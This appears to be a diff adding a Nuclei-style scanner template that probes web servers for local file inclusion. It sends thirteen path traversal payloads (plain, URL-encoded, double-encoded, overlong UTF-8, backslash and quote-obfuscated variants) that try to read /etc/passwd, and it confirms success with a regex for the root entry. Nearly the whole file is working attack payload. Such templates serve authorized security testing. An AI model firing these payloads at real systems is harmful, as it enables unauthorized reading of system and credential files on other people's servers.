@@ -1,0 +1,44 @@
+id: storenth-lfi
+info:
+  name: storenth LFI
+  author: storenth
+  severity: high
+  reference: https://blog.cobalt.io/a-pentesters-guide-to-file-inclusion-8fdfc30275da
+  tags: storenth,lfi
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}../../../../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}cat%20/etc/passwd"
+      - "{{BaseURL}}%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+      - "{{BaseURL}}user/local/../../../../../../../../../../../../../../../../../../../etc/passwd/../../../../../../../../../../../../../../../../../../../etc/passwd"
+      - '{{BaseURL}}\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd'
+      - "{{BaseURL}}user/local/../../../../../../../../../../../../../../../../../../../e't'c/p'a's's'w'd'"
+      - "{{BaseURL}}%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      - "{{BaseURL}}META-INF/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/etc/passwd"
+      - "{{BaseURL}}À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/etc/passwd"
+      - "{{BaseURL}}META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+      - "{{BaseURL}}%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+      - "{{BaseURL}}..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
+    headers:
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36"
+          
+
+    # matchers-condition: and
+    matchers:
+
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+        part: body
+
+      # - type: status
+      #   status:
+      #     - 200
+
+      # - type: word
+      #   words:
+      #     - "Instructievideo"
+      #   part: body
